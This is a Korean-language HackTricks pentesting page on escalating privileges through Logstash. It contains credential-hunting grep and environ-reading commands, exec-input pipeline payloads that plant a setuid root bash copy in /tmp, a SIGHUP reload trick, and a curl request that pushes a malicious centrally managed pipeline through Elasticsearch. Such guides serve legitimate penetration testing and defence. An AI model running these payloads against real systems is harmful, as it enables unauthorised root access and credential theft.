# Logstash 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash는 **pipelines**로 알려진 시스템을 통해 **로그를 수집하고, 변환하며, 전달**하는 데 사용됩니다. 이러한 pipelines는 **input**, **filter**, **output** 단계로 구성됩니다. Logstash가 침해된 시스템에서 실행될 때 흥미로운 상황이 발생합니다.

### Pipeline Configuration

Pipeline은 pipeline configuration의 위치를 나열하는 **/etc/logstash/pipelines.yml** 파일에서 구성됩니다:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
이 파일은 pipeline 구성이 포함된 **.conf** 파일의 위치를 보여 줍니다. **Elasticsearch output module**을 사용하는 경우, **pipelines**에 **Elasticsearch credentials**가 포함되는 일이 흔하며, Logstash가 Elasticsearch에 데이터를 기록해야 하므로 이러한 credentials는 광범위한 권한을 보유하는 경우가 많습니다. 구성 경로의 와일드카드를 사용하면 Logstash가 지정된 디렉터리에서 일치하는 모든 pipeline을 실행할 수 있습니다.

Logstash를 `pipelines.yml` 대신 `-f <directory>`와 함께 시작하면, 해당 디렉터리의 **모든 파일이 사전식 순서로 연결된 후 단일 config로 파싱**됩니다. 이로 인해 다음과 같은 2가지 공격적 영향이 발생합니다.

- `000-input.conf` 또는 `zzz-output.conf`와 같은 파일을 추가하면 최종 pipeline 조립 방식을 변경할 수 있습니다.
- 잘못된 형식의 파일 하나로 인해 전체 pipeline이 로드되지 않을 수 있으므로, auto-reload에 의존하기 전에 payload를 신중하게 검증해야 합니다.

### Compromised Host에서의 빠른 Enumeration

Logstash가 설치된 시스템에서 다음을 빠르게 확인합니다:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
또한 로컬 모니터링 API에 접근 가능한지도 확인합니다. 기본적으로 **127.0.0.1:9600**에 바인딩되며, 일반적으로 호스트에 진입한 후에는 이것으로 충분합니다:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
일반적으로 pipeline ID, runtime 세부 정보, 그리고 수정한 pipeline이 로드되었다는 확인 정보를 제공합니다.

Logstash에서 복구한 Credentials는 일반적으로 **Elasticsearch**의 잠금을 해제하므로, [Elasticsearch에 관한 다른 페이지](../../network-services-pentesting/9200-pentesting-elasticsearch.md)를 확인하세요.

### Writable Pipelines를 통한 Privilege Escalation

Privilege Escalation을 시도하려면 먼저 Logstash service가 실행 중인 user를 식별합니다. 일반적으로 **logstash** user입니다. 다음 기준 중 **하나**를 충족하는지 확인하세요:

- pipeline **.conf** file에 대한 **write access** 보유 또는
- **/etc/logstash/pipelines.yml** file이 wildcard를 사용하며 대상 folder에 write할 수 있음

추가로 다음 조건 중 **하나**를 충족해야 합니다:

- Logstash service를 restart할 수 있음 또는
- **/etc/logstash/logstash.yml** file에 **config.reload.automatic: true**가 설정되어 있음

Configuration에 wildcard가 있으면 이 wildcard와 일치하는 file을 생성하여 command execution을 수행할 수 있습니다. 예:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
여기서 **interval**은 실행 주기를 초 단위로 결정합니다. 주어진 예시에서는 **whoami** command가 120초마다 실행되며, 출력은 **/tmp/output.log**로 전달됩니다.

**/etc/logstash/logstash.yml**에서 **config.reload.automatic: true**로 설정하면 Logstash는 재시작할 필요 없이 새 pipeline configuration이나 수정된 pipeline configuration을 자동으로 감지하고 적용합니다.<sup>[[1]](#references)</sup> wildcard가 없더라도 기존 configuration은 수정할 수 있지만, 중단을 방지하기 위해 주의해야 합니다.

### 더 안정적인 Pipeline Payload

`exec` input plugin은 현재 release에서도 여전히 작동하며 **interval** 또는 **schedule** 중 하나가 필요합니다. 이 plugin은 Logstash JVM을 **forking**하여 실행하므로, 메모리가 부족하면 payload가 조용히 실행되는 대신 `ENOMEM` 오류로 실패할 수 있습니다.

보다 실용적인 privilege-escalation payload는 일반적으로 지속적인 artifact를 남기는 방식입니다:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
재시작 권한이 없지만 프로세스에 signal을 보낼 수 있다면, Logstash는 Unix 계열 시스템에서 **SIGHUP**으로 트리거되는 reload도 지원합니다:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
모든 plugin이 reload를 지원하는 것은 아니라는 점에 유의하세요. 예를 들어 **stdin** input은 automatic reload를 방지하므로, `config.reload.automatic`이 항상 변경 사항을 반영할 것이라고 가정하지 마세요.<sup>[[1]](#references)</sup>

### Logstash에서 Secrets 탈취

code execution에만 집중하기 전에, Logstash가 이미 접근할 수 있는 데이터를 수집하세요:

- Plaintext credentials는 종종 `elasticsearch {}` outputs, `http_poller`, JDBC inputs 또는 cloud 관련 설정에 hardcode되어 있습니다.
- Secure settings는 **`/etc/logstash/logstash.keystore`** 또는 다른 `path.settings` directory에 있을 수 있습니다.
- keystore password는 자주 **`LOGSTASH_KEYSTORE_PASS`**를 통해 제공되며, package 기반 install에서는 일반적으로 **`/etc/sysconfig/logstash`**에서 이를 source합니다.
- `${VAR}`를 사용한 environment-variable expansion은 Logstash startup 시 resolve되므로, service environment를 검사할 가치가 있습니다.

유용한 checks:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
이 내용도 확인할 가치가 있습니다. **CVE-2023-46672**는 특정 상황에서 Logstash가 민감한 정보를 로그에 기록할 수 있음을 보여주었습니다. 따라서 post-exploitation host에서는 현재 config가 secrets를 inline으로 저장하는 대신 keystore를 참조하더라도, 오래된 Logstash 로그와 `journald` entries에 credentials가 노출될 수 있습니다.<sup>[[3]](#references)</sup>

### Centralized Pipeline Management Abuse

일부 환경에서는 host가 로컬 `.conf` files에 전혀 의존하지 않습니다. **`xpack.management.enabled: true`**가 설정되어 있으면 Logstash는 Elasticsearch/Kibana에서 centrally managed pipelines를 가져올 수 있으며, 이 mode를 활성화한 후에는 로컬 pipeline configs가 더 이상 source of truth가 아닙니다.<sup>[[2]](#references)</sup>

이는 다른 attack path를 의미합니다.

1. 로컬 Logstash settings, keystore 또는 logs에서 Elastic credentials를 복구합니다.
2. 해당 account에 **`manage_logstash_pipelines`** cluster privilege가 있는지 확인합니다.
3. centrally managed pipeline을 생성하거나 교체하여, 다음 poll interval에 Logstash host가 payload를 실행하도록 합니다.

이 기능에 사용되는 Elasticsearch API는 다음과 같습니다.<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
이는 local files가 read-only이지만 Logstash가 이미 원격에서 pipelines를 가져오도록 등록된 경우 특히 유용합니다.

## References

- [1] [Elastic Docs: Config File 다시 로드](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Centralized Pipeline Management 구성](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
